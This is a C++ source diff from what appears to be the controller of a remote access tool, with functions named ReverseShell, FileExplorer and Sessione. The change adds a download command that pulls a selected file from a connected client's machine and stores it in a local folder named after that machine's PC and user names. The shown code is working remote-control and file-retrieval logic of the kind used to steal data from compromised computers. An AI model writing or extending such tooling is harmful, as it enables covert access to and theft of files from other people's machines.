@@ -605,13 +605,14 @@ bool ReverseShell(SOCKET Sock)
     return false;
 }
 
-short FileExplorer(SOCKET Sock)
+short FileExplorer(SOCKET Sock, int ID)
 {
     CliFileExplorer cfe;
     ConsoleUtils cu;
     TextColor tc;
     CLInterface cli;
     DirUtils du;
+    SystemUtils su;
     string Res = "";
     json j;
 
@@ -790,7 +791,7 @@ short FileExplorer(SOCKET Sock)
 
                 if (Res == "")
                     return 2;
-                
+
                 cfe.FilesParse(json::parse(Res));
                 cfe.UpdateContent();
 
@@ -853,10 +854,8 @@ short FileExplorer(SOCKET Sock)
                 cout << "Uploading... ";
 
                 if (!COMUNICAZIONI::UploadFileWithLoading(Sock, FileName, du.GetBinaryFileContent(LocalFile), cfe.HelpSize))
-                {
-                    cfe.RealignVisual();
                     return 2;
-                }
+
                 cfe.RealignVisual();
 
                 if (!TcpIP::RecvString(Sock, Res))
@@ -885,6 +884,67 @@ short FileExplorer(SOCKET Sock)
                 }
                 else
                     return 2;
+
+                break;
+            }
+
+            case 100: // D
+            {
+                string FileContent;
+                string FileName;
+                string LocalFolder = du.GetModuleFilePath() + Clients[ID].info.PCname + "_" + Clients[ID].info.UserName;
+
+                if (!cfe.CurrSelectionInfo().Type)
+                {
+                    cfe.UpdateContent();
+                    cout << "Please select a file, for directory use ZIP first.";
+                    break;
+                }
+
+                j.clear();
+                j["Action"] = "Download";
+                j["Path"] = cfe.CurrSelectionInfo().FullPath;
+
+                if (!TcpIP::SendString(Sock, j.dump()))
+                    return 2;
+
+                cout << "Downloading... ";
+
+                if (!COMUNICAZIONI::DownloadFileWithLoading(Sock, FileName, FileContent, cfe.HelpSize))
+                    return 2;
+
+                cfe.RealignVisual();
+                cfe.UpdateContent();
+
+                if (!du.CheckDir(LocalFolder))
+                    if (!du.MakeDir(LocalFolder))
+                    {
+                        tc.SetColor(tc.Red);
+                        cout << "Failed: unable to create local downloads folder.";
+                        tc.SetColor(tc.Default);
+                        break;
+                    }
+
+                LocalFolder += "\\Downloads";
+
+                if (!du.CheckDir(LocalFolder))
+                    if (!du.MakeDir(LocalFolder))
+                    {
+                        tc.SetColor(tc.Red);
+                        cout << "Failed: unable to create local downloads folder.";
+                        tc.SetColor(tc.Default);
+                        break;
+                    }
+
+                if (!du.WriteBinaryFile(LocalFolder + "\\" + FileName, FileContent))
+                {
+                    tc.SetColor(tc.Red);
+                    cout << "Failed: unable to save local file.";
+                    tc.SetColor(tc.Default);
+                    break;
+                }
+
+                su.NoOutputCMD("start \"\" \"" + LocalFolder + "\"");
 
                 break;
             }
@@ -1032,7 +1092,7 @@ void Sessione(int ID, SOCKET Sock)
                 StampaIncompatibile();
             else
             {
-                switch (FileExplorer(Sock))
+                switch (FileExplorer(Sock, ID))
                 {
                     case 0:
                         system("cls");
